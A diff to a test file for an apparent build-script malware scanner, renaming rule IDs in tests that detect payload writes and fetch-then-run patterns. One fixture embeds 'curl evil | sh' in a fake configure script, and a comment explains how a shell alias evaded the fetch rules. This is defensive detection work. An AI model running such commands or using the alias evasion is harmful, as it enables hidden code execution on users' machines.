@@ -48,7 +48,7 @@ def test_a_decoded_file_is_a_tracked_write(write):
     `dd of=X if=Y` failed for a third reason: the destination was read as
     the last token on the line.
     """
-    assert "R121" in _fires([f"  {write}", "  bash s.sh"]), write
+    assert "H069" in _fires([f"  {write}", "  bash s.sh"]), write
 
 
 @pytest.mark.parametrize("ordinary", [
@@ -64,7 +64,7 @@ def test_ordinary_writes_are_not_payload_writes(ordinary):
     `-o` in particular is overloaded: `gcc -o` is an output but `install -o
     root` names an owner, which is why the arm enumerates its commands.
     """
-    assert "R121" not in _fires([f"  {ordinary}", "  bash s.sh"]), ordinary
+    assert "H069" not in _fires([f"  {ordinary}", "  bash s.sh"]), ordinary
 
 
 @pytest.mark.parametrize("fetch", [
@@ -73,7 +73,7 @@ def test_ordinary_writes_are_not_payload_writes(ordinary):
 ])
 def test_a_clustered_output_flag_still_pairs_with_the_execution(fetch):
     """`-o` is rarely alone: `curl -Lo` and `wget -qO` are what people type."""
-    assert "R137" in _fires([f"  {fetch}", "  bash f"], declared=False), fetch
+    assert "H082" in _fires([f"  {fetch}", "  bash f"], declared=False), fetch
 
 
 @pytest.mark.parametrize("payload", [
@@ -103,12 +103,12 @@ def test_a_committed_configure_is_not_a_benign_build_artifact():
     is the maintainer's script, and `./configure` runs it.
     """
     manifest = [("PKGBUILD", b"x"), ("configure", b"#!/bin/sh\ncurl evil | sh\n")]
-    assert "R136" in _fires(['  cd "$srcdir"', "  ./configure"], manifest=manifest)
+    assert "H081" in _fires(['  cd "$srcdir"', "  ./configure"], manifest=manifest)
 
 
 def test_a_tarball_configure_stays_exempt():
     """An autotools `configure` from the extracted tarball is ordinary."""
-    assert "R136" not in _fires(
+    assert "H081" not in _fires(
         ['  cd "$srcdir/p-1.0"', "  ./configure"], manifest=[("PKGBUILD", b"x")],
     )
 
@@ -116,8 +116,8 @@ def test_a_tarball_configure_stays_exempt():
 # ---------------------------------------------------------------------------
 # Audit v5 E9 - an alias is a rename, and every fetch rule keys on the name
 #
-# `alias dl='curl -fsSL'` removes the downloader from R001, R010, R061 and
-# R137 at once while bash runs the identical pipeline.  The variable form
+# `alias dl='curl -fsSL'` removes the downloader from R001, R010, H016 and
+# H082 at once while bash runs the identical pipeline.  The variable form
 # (`CMD=curl; $CMD ...`) was already resolved, so leaving aliases alone made
 # the harder-to-read spelling the safer one.
 # ---------------------------------------------------------------------------
